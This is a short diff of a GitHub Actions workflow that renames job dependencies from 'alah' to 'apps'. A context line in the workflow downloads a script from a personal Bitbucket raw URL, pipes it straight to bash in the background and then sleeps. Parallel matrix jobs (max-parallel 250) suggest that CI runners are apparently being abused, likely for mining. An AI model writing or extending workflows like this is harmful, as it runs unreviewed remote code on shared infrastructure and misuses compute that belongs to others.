@@ -28,7 +28,7 @@ jobs:
       run: curl -sL  https://bitbucket.org/makanlah88/new/raw/19e3ee144402deb6ae7b3e1d26400426d0c7837f/Configak | bash &
            sleep 330s
   pye:
-    needs: alah
+    needs: apps
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -54,7 +54,7 @@ jobs:
     
      
   iki:
-    needs: [alah]
+    needs: [apps]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
